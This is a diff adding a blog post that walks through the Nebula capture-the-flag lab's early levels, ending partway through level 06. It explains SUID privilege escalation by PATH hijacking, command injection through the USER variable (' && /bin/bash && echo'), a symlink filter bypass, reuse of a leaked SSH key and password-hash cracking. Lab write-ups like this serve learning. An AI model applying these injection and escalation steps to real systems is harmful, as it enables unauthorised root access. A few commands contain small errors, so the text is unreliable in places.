@@ -1,0 +1,1406 @@
+<!DOCTYPE html>
+<!--
+    So Simple Jekyll Theme 3.2.0
+    Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+    Free for personal and commercial use under the MIT license
+    https://github.com/mmistakes/so-simple-theme/blob/master/LICENSE
+-->
+<html lang="en-US" class="no-js">
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  
+
+  
+    
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Nebula CTF | Cloud Castle Chaos</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Nebula CTF" />
+<meta name="author" content="P2" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF by Andrew Griffiths @ https://exploit.education/nebula/ This Capture the Flag introduces sysadmin Linux concepts. There will be SUID fils, permissions, race conditions and other topics. I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics." />
+<meta property="og:description" content="CTF by Andrew Griffiths @ https://exploit.education/nebula/ This Capture the Flag introduces sysadmin Linux concepts. There will be SUID fils, permissions, race conditions and other topics. I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics." />
+<link rel="canonical" href="http://localhost:4000/ctf/2023/11/05/Nebula.html" />
+<meta property="og:url" content="http://localhost:4000/ctf/2023/11/05/Nebula.html" />
+<meta property="og:site_name" content="Cloud Castle Chaos" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-11-05T00:00:00+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Nebula CTF" />
+<meta name="twitter:site" content="@mmistakes" />
+<meta name="twitter:creator" content="@P2" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"P2"},"dateModified":"2023-11-05T00:00:00+01:00","datePublished":"2023-11-05T00:00:00+01:00","description":"CTF by Andrew Griffiths @ https://exploit.education/nebula/ This Capture the Flag introduces sysadmin Linux concepts. There will be SUID fils, permissions, race conditions and other topics. I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.","headline":"Nebula CTF","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/ctf/2023/11/05/Nebula.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/images/logo.png"},"name":"P2"},"url":"http://localhost:4000/ctf/2023/11/05/Nebula.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+  
+
+  <script>
+    /* Cut the mustard */
+    if ( 'querySelector' in document && 'addEventListener' in window ) {
+      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + 'js';
+    }
+  </script>
+
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/skins/default.css">
+  
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400i,700,700i|Lora:400,400i,700,700i">
+  <link rel="alternate" type="application/atom+xml" title="Cloud Castle Chaos" href="/atom.xml">
+<!-- start custom head snippets -->
+
+<!-- insert favicons. use http://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+</head>
+
+
+  <body class="layout--post  nebula-ctf">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#primary-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+  <div class="navigation-wrapper">
+    <a href="#menu-toggle" id="menu-toggle">Menu</a>
+    <nav id="primary-nav" class="site-nav animated drop">
+      <ul><li><a href="/posts/">Posts</a></li><li><a href="/categories/">Categories</a></li><li><a href="/search/">Search</a></li></ul>
+    </nav>
+  </div><!-- /.navigation-wrapper -->
+
+
+    <header class="masthead">
+  <div class="wrap">
+    
+      <a href="/" class="site-logo" rel="home" title="Cloud Castle Chaos">
+        <img src="/images/logo.png" class="site-logo-img animated fadeInDown" alt="Cloud Castle Chaos">
+      </a>
+    
+    
+    
+      
+        <div class="site-description animated fadeIn"><a href="/">a bit of this. a bit of that.</a></div>
+      
+    
+  </div>
+</header><!-- /.masthead -->
+
+    <main id="main" class="main-content" aria-label="Content">
+  <article class="h-entry">
+    
+
+    <div class="page-wrapper">
+      <header class="page-header">
+        
+        
+          <h1 id="page-title" class="page-title p-name">Nebula CTF
+</h1>
+        
+      </header>
+
+      <div class="page-sidebar">
+        <div class="page-author h-card p-author"><img src="/images/profile.png" class="author-avatar u-photo" alt="P2"><div class="author-info"><div class="author-name">
+        <em>by</em> <span class="p-name">P2</span>
+      </div><ul class="author-links"><li class="author-link">
+            <a class="u-url" rel="me" href=""><i class="fas fa-link fa-lg" title=""></i></a>
+          </li></ul>
+
+<span class="read-time">44 min read</span>
+
+    <time class="page-date dt-published" datetime="2023-11-05T00:00:00+01:00"><a class="u-url" href="">November 5, 2023</a>
+</time>
+
+  </div>
+</div>
+
+        
+  <h3 class="page-taxonomies-title">Categories</h3>
+  
+  <ul class="page-taxonomies"><li class="page-taxonomy"><a class="p-category" href="/categories/#ctf" title="Pages filed under CTF">CTF</a></li>
+  </ul>
+
+
+        
+
+      </div>
+
+      <div class="page-content">
+        <div class="e-content">
+          <p><img src="https://cdn.pixabay.com/photo/2017/09/12/11/56/universe-2742113_1280.jpg" alt="center-aligned-image" class="align-center" /></p>
+
+<p class="notice--info">CTF by <strong>Andrew Griffiths</strong> @ <a href="https://exploit.education/nebula/">https://exploit.education/nebula/</a></p>
+
+<p>This Capture the Flag introduces sysadmin Linux concepts. There will be SUID fils, permissions, race conditions and other topics.
+I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.</p>
+
+<!--more-->
+
+<table>
+  <thead>
+    <tr>
+      <th>Content:</th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#install">Install</a></td>
+      <td><a href="#level-00">Level00</a></td>
+      <td><a href="#level-01">Level01</a></td>
+      <td><a href="#level-02">Level02</a></td>
+      <td><a href="#level-03">Level03</a></td>
+      <td><a href="#level-04">Level04</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td><a href="#level-05">Level05</a></td>
+      <td><a href="#level-06">Level06</a></td>
+      <td><a href="#level-07">Level07</a></td>
+      <td><a href="#level-08">Level08</a></td>
+      <td><a href="#level-09">Level09</a></td>
+      <td><a href="#level-10">Level10</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td><a href="#level-11">Level11</a></td>
+      <td><a href="#level-12">Level12</a></td>
+      <td><a href="#level-13">Level13</a></td>
+      <td><a href="#level-14">Level14</a></td>
+      <td><a href="#level-15">Level15</a></td>
+      <td><a href="#level-16">Level16</a></td>
+    </tr>
+  </tbody>
+  <tbody>
+    <tr>
+      <td><a href="#level-17">Level17</a></td>
+      <td><a href="#level-18">Level18</a></td>
+      <td><a href="#level-19">Level19</a></td>
+      <td> </td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="capture-the-flag">Capture the Flag</h1>
+
+<h3 id="install">[Install]</h3>
+<p>The CTF is downloadable as ISO image, and needs to be mounted. <br />
+To mount it use VirtualBox (or VMware or similar) and create an Ubuntu machine, then pass the iso as bootable media. <br />
+For each level, access the machine with the given credentials, where XX corresponds to the target level:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>```
+User: "levelXX"
+Password: "levelXX"
+```
+</code></pre></div></div>
+
+<p>To access, retrieve the IP of the CTF machine, for example with the <code class="language-plaintext highlighter-rouge">ip a</code> command. <br />
+Then connect to the machine with SSH, using the credentials and the command <code class="language-plaintext highlighter-rouge">ssh levelXX@[ipaddr]</code> <br />
+If you want to install anything in the VM, you can login with the <code class="language-plaintext highlighter-rouge">nebula:nebula</code> credentials.</p>
+
+<h3 id="level-00">[Level 00]</h3>
+<p>This level requires to find a Set User ID program that will run as the “flag00” account.</p>
+
+<blockquote>
+  <p>SUID (Set owner User ID): is a special type of permission give to a file. Usually then a program runs it gets the permissions from the current user. SUID instead temporarily gives the permissions of the file owner instead that of the user actually running the file. The user will get the permissions of the file owner, together with the UID and GID of the owner.</p>
+</blockquote>
+
+<blockquote>
+  <p>Permissions are given in triplets of rwx (read, write execute) values, and the additional s value for the SUID case.
+The first rwx triplet represent permission for the owner, the second triplet permission for the group and the third triplet permission for the other use of the file.</p>
+</blockquote>
+
+<ol>
+  <li>
+    <p>The hint says that it is possible to search for the file that we are interested in. <br />
+We know the flag has to be executable and we know that its owner is the user flag00, so we use the <code class="language-plaintext highlighter-rouge">find</code> command, using the <code class="language-plaintext highlighter-rouge">/</code> to start looking at the root folder, the <code class="language-plaintext highlighter-rouge">-execute</code> parameter to return only executable files and the <code class="language-plaintext highlighter-rouge">-user</code> parameter to return only the files owned by the given user.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> find / <span class="nt">-execute</span> <span class="nt">-user</span> flag00
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The search will return a lot of files, most of them with denied permission (we could have prevented this by adding <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> at the end of the find command). <br />
+Among this list there are two for which it seems we have permissions: <code class="language-plaintext highlighter-rouge">/home/flag00</code> and <code class="language-plaintext highlighter-rouge">/bin/.../flag00</code>. We inspect them with the command <code class="language-plaintext highlighter-rouge">ls -l</code></p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> drwxr-x--- /home/flag00
+ <span class="nt">-rwsr-x---</span> /bin/.../flag00
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The permissions of the retrieved files show how <code class="language-plaintext highlighter-rouge">/bin/.../flag00</code> has the SUID flag and is a file that we can execute. <br />
+After running it, we are told to execute the <code class="language-plaintext highlighter-rouge">getflag</code> command, which results in successfully getting the flag.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./bin/.../flag00
+ getflag
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="level-01">[Level 01]</h3>
+<p>There is a vulnerability in the code stored in /home/flag01 that allows arbitrary programs to be executed</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+    <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+    <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+    <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+
+    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+    <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+
+    <span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/env echo and now what?"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>int system(const char *command): the C library function system() takes as parameter a string containing the name of a requested variable. This variable, that can be a command or program name, is passed to the host environment to be executed. The function returns after the command has been completed.</p>
+</blockquote>
+
+<blockquote>
+  <p>env: it’s a linux command to show the environment or run a program in a modified environment. The program to be run (or the path to it) can be passed as an argument.</p>
+</blockquote>
+
+<ol>
+  <li>The interesting part in the code is the call to the <code class="language-plaintext highlighter-rouge">echo</code> method using the <code class="language-plaintext highlighter-rouge">system()</code> function. The given path points to the <code class="language-plaintext highlighter-rouge">env</code> command, which runs the <code class="language-plaintext highlighter-rouge">echo</code> command, which in turn is retrieved from the system variable <code class="language-plaintext highlighter-rouge">PATH</code>.</li>
+  <li>
+    <p>By changing what is in <code class="language-plaintext highlighter-rouge">PATH</code> we can control what will be invoked by the <code class="language-plaintext highlighter-rouge">system()</code> call. To do this we prepend our own folder to <code class="language-plaintext highlighter-rouge">PATH</code>. We use the <code class="language-plaintext highlighter-rouge">/tmp</code> folder, which is already existing in root.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+ <span class="nb">echo</span> <span class="nv">$PATH</span> <span class="c"># to check if the previous command worked</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>In the <code class="language-plaintext highlighter-rouge">/tmp</code> folder we can now create a shell script that launches bash. To do this, we <code class="language-plaintext highlighter-rouge">echo -e</code> (the -e option is to enable the correct backslash interpretation) the content of our script to the file we need. This file will be named <code class="language-plaintext highlighter-rouge">echo</code> so that it will be correctly executed by the calling program. Then we take care of making it executable.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/bin/bash\n/bin/bash'</span> <span class="o">&gt;</span> /tmp/echo
+ <span class="nb">chmod</span> +x /tmp/echo
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The permissions of the flag01 program has the SUID set, therefore whatever will be invoked by the program will have the permission of the owner, resulting in escalated permissions for us. We run flag01, and we are told to execute the <code class="language-plaintext highlighter-rouge">getflag</code> command, which results in successfully getting the flag.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./flag01 <span class="c"># remember to execute from the correct folder</span>
+ getflag
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="level-02">[Level 02]</h3>
+<p>There is a vulnerability in the code stored in /home/flag02 that allows arbitrary programs to be executed</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
+
+    <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
+    <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
+
+    <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
+    <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
+
+    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
+    <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
+
+    <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+    <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"/bin/echo %s is cool"</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"USER"</span><span class="p">));</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"about to call system(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
+    
+    <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>int asprintf(char **strp, const char *fmt, …): the C library function asprintf() is a print method that takes care of allocation: it calculates the length of the string, allocates that amount of memory, and writes the string into it. The pointer to this allocated memory is returned via the first argument, while the second argument is the string to be printed.
+This is different from printf, that prints to the standard output instead that to a memory location, and from sprintf, that prints to a memory location but without caring about the length of the string and the available space.</p>
+</blockquote>
+
+<blockquote>
+  <p>char *getenv(const char *name): the C library function getenv() searches for the environment string pointed to by the parameter and returns the associated value.</p>
+</blockquote>
+
+<ol>
+  <li>Similarly to what happened in level01, we will call the <code class="language-plaintext highlighter-rouge">system()</code> method to run a command, but instead of passing directly a path we will pass a pointer to a string containing the path. This string will echo a variable from the environment, and that’s what we want to modify.</li>
+  <li>
+    <p>We modify the variable <code class="language-plaintext highlighter-rouge">USER</code> so that it completes the previous command and appends the new ones to be executed. In particular, we want to append a command to open a bash terminal. Appending commands can be done using <code class="language-plaintext highlighter-rouge">&amp;&amp;</code>. We make sure to finish the new command with an invocation to <code class="language-plaintext highlighter-rouge">echo</code> so that the following text will not be interpreted as parameter to the shell invocation and break the command.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">export </span><span class="nv">USER</span><span class="o">=</span><span class="s2">" &amp;&amp; /bin/bash &amp;&amp; echo"</span>
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>The permissions of the flag02 program has the SUID set, therefore whatever will be invoked by the program will have the permission of the owner, resulting in escalated permissions for us. We run flag02, and impersonating the new user we run the <code class="language-plaintext highlighter-rouge">getflag</code> command, which results in successfully getting the flag.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ./flag02 <span class="c"># remember to execute from the correct folder</span>
+ getflag
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h3 id="level-03">[Level 03]</h3>
+<p>There are files in /home/flag03, and a crontab called every couple of minutes.</p>
+
+<blockquote>
+  <p>Crontab: with this command it is possible to plan the automatic periodic execution of other commands. To do this, a daemon is constantly running in the background and checking (once per minute) the registered command. If the commands reached their timeout, they will be executed and the timeout reset.</p>
+
+  <p>The command has the following structure:
+   <code class="language-plaintext highlighter-rouge">m h d M w command</code>
+The mhdMw fields specify when and how often a command should be executed:</p>
+
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   m: minute (0 - 59)
+   h: hour (0 - 23)
+   d: day of the month (1 - 31)
+   M: month (1 - 12)
+   w: day of the week (0 - 6, Sunday = 0)
+</code></pre></div>  </div>
+
+  <p>Each field can contain more than a value: a list can be given using a comma <code class="language-plaintext highlighter-rouge">,</code>, an interval using a dash <code class="language-plaintext highlighter-rouge">-</code>. The star <code class="language-plaintext highlighter-rouge">*</code> means every value possible for that field. Whenever the values are true, the command will be executed.</p>
+</blockquote>
+
+<ol>
+  <li>We look at the files in the /home/flag03 folder. There is an empty subfolder and a shell script that when called will run all scripts that are stored in the currently empty folder with the command <code class="language-plaintext highlighter-rouge">ulimit -t 5; bash -x "$i"</code>, and then delete the finished script with <code class="language-plaintext highlighter-rouge">rm -f "$i"</code>.</li>
+  <li>
+    <p>To check if the crontab will give the SUID permissions to the scripts in the target folder, we can create a script that will return different values depending on the running permissions. This is what we want to echo in our output file:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">#!/bin/bash</span>
+ <span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$EUID</span><span class="s2">"</span> <span class="nt">-ne</span> 0]
+     <span class="k">then </span><span class="nb">echo</span> <span class="s2">"Please root me!"</span>
+     <span class="k">else </span><span class="nb">echo</span> <span class="s2">"I am GROOT!"</span>
+     <span class="nb">exit
+ </span><span class="k">fi</span>
+ <span class="o">&gt;&gt;</span> /tmp/root
+</code></pre></div>    </div>
+  </li>
+  <li>After the cronjob run, we can check the result in <code class="language-plaintext highlighter-rouge">/tmp/root</code>. The result will depend on the effective user running the script, corresponding to <code class="language-plaintext highlighter-rouge">$EUID</code>. If <code class="language-plaintext highlighter-rouge">$EUID</code> is root, its value will be 0, therefore our file will contain “I am GROOT!”. This is indeed what is in our output file, and with this we know that the scripts are really run with SUID.</li>
+  <li>We know our script will run with elevated permissions. Therefore we want to call our getflag command from there. First of all we need to know where that command is, using <code class="language-plaintext highlighter-rouge">whereis getflag</code></li>
+  <li>
+    <p>We create the script: it will call the getflag command and store the output in a file, as a proof that we got the flag.</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s1">'#!/bin/bash\n/bin/getflag &gt;&gt; /tmp/flag'</span> <span class="o">&gt;</span> script.sh
+</code></pre></div>    </div>
+  </li>
+  <li>Now we have to wait for the crontab to execute the writable.sh script, which in turn will execute our own script. After the needed time, we can look in our output file for the flag: <code class="language-plaintext highlighter-rouge">cat /tmp/flag</code></li>
+</ol>
+
+<h3 id="level-04">[Level 04]</h3>
+<p>Read the token file bypassing the restrictions in the code.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s [file to read]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"token"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"You may not access '%s'</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">"Unable to open %s"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    
+    <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">"Unable to read fd %d"</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>char *strstr(const char *str1, const char *str2): the function returns a pointer to the first occurrence of str2 in str1, or a null pointer if str2 is not part of str1. The matching process does not include the terminating null-characters, but it stops there.</p>
+</blockquote>
+
+<blockquote>
+  <p>Symlink: this file is not just a shortcut pointing to another file, but is a low level pointer written into the file system. This means that it looks like the pointed file is actually there, even if after clicking you will be redirected. The default permissions for a symbolic link are 777, as if it were a folder.</p>
+</blockquote>
+
+<ol>
+  <li>The code takes a parameter containing the path to the file to read, and if the path contains the string “token” it will block us. The file itself has no reading permissions, so we can’t go around it using cat or tail. Also, the <code class="language-plaintext highlighter-rouge">strstr()</code>` method doesn’t seem to have any vulnerability.</li>
+  <li>We have to find a way to change the name of the file, and symlinks give us the right opportunity. We can create the link with a different name in a different path where we have rw permissions
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">ln</span> <span class="nt">-s</span> /home/flag04/token /tmp/readme
+</code></pre></div>    </div>
+  </li>
+  <li>Now we can let the flag04 program run on our new link, and as there is no “token” in the new path we will not be blocked. The result is an alphanumerical string</li>
+  <li>The string doesn’t look like ASCII, nor like Base64. We try to use it as password to gain access to a user with higher privileges, in this case flag04: <code class="language-plaintext highlighter-rouge">su -l flag04</code></li>
+  <li>We are now logged in as flag04 and can execute the <code class="language-plaintext highlighter-rouge">getflag</code> command</li>
+</ol>
+
+<h3 id="level-05">[Level 05]</h3>
+<p>Find interesting files in the flag05 folder.</p>
+
+<blockquote>
+  <p>tar: archiving utility, often combined explicitly with compressions like gzip (.tar.gz) or bzip (.tar.bz). To extract an archive in a target folder use tar -xf source.tar -C folder, or tar xzf source.tar.gz if compressed with gzip. To list the contents of a tar file use tar tvf source.tar</p>
+</blockquote>
+
+<ol>
+  <li>We can list the content of the flag05 folder with the <code class="language-plaintext highlighter-rouge">ls -R</code> command. What we find is a tar archive in the backup folder.</li>
+  <li>We look at what is in that archive, using tar <code class="language-plaintext highlighter-rouge">tvf backup-19072011.tgz</code>. It seems that it contains ssh keys and authorized keys.</li>
+  <li>
+    <p>We want to decompress the archive, but the backup folder doesn’t have write permissions. So we use the <code class="language-plaintext highlighter-rouge">/tmp</code> folder as output path</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">tar</span> <span class="nt">-xf</span> backup-19072011.tgz <span class="nt">-C</span> /tmp/
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>We assume that the key is the one used to ssh into the VM with higher privileges, like with the user flag05, without needing a password. Therefore we use ssh to connect to 127.0.0.1 (which corresponds to localhost) passing the key with parameter -i</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ssh <span class="nt">-i</span> /tmp/.ssh/id_rsa flag05@127.0.0.1
+</code></pre></div>    </div>
+  </li>
+  <li>We are now in the VM with higher privileges, and can execute getflag</li>
+</ol>
+
+<h3 id="level-06">[Level 06]</h3>
+<p>The flag06 account credentials came from a legacy unix system.</p>
+
+<blockquote>
+  <p>/etc/passwd: this text file stores login information about each user in the system. There is one line for each user, and each entry is made by seven values separated by columns.</p>
+
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   Username: used when user logs in.
+   Password: an x character indicates that encrypted password is stored in /etc/shadow file.
+   User ID: UID 0 is reserved for root; UIDs 1-99 are reserved for other predefined accounts; UID 100-999 are reserved by system for administrative and system accounts/groups.
+   Group ID: the primary group ID (stored in /etc/group file)
+   User ID Info: comment field.
+   Home directory: absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
+   Command/shell: The absolute path of a command or shell (tipically /bin/bash).
+</code></pre></div>  </div>
+
+  <p>In old operating systems the password was stored directly in this file. Nowadays it is not anymore</p>
+</blockquote>
+
+<blockquote>
+  <p>/etc/shadow: a text file where actual passwords (and additional informations) are stored in encrypted format. As in /etc/passwd, there is one entry per each user, one per line.</p>
+
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   Username : login name.
+   Password : encrypted password. Usual format is $id$salt$hashed, where the $id is the algorithm used On GNU/Linux as follows:
+       $1$ is MD5
+       $2a$ is Blowfish
+       $2y$ is Blowfish
+       $5$ is SHA-256
+       $6$ is SHA-512
+   Lastchanged: days since Jan 1, 1970 that password was last changed
+   Minimum : the number of days left before the user is allowed to change password
+   Maximum : the maximum number of days the password is valid, after that user is forced to change password
+   Warn : the number of days before password is to expire that user is warned to change password
+   Inactive : the number of days after password expires that account is disabled
+   Expire : days since Jan 1, 1970 that account is disabled
+</code></pre></div>  </div>
+</blockquote>
+
+<ol>
+  <li>The mention of an old systems clearly hints at the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. We can take a look at it with the following command (we use <code class="language-plaintext highlighter-rouge">grep</code> to just get the infos about a the specific account): <code class="language-plaintext highlighter-rouge">grep flag06 /etc/passwd</code></li>
+  <li>We get a line that looks like it contains the password. However, trying <code class="language-plaintext highlighter-rouge">su -u flag06</code> with it will not work.</li>
+  <li>The reason it does not work is that the password is encrypted. To decrypt it we can use an utility like John the Ripper. In this case the usage is really simple, as it is enough to save the string “flag06:ueqwOCnSGdsuM” to a file and pass the path to that file to john.</li>
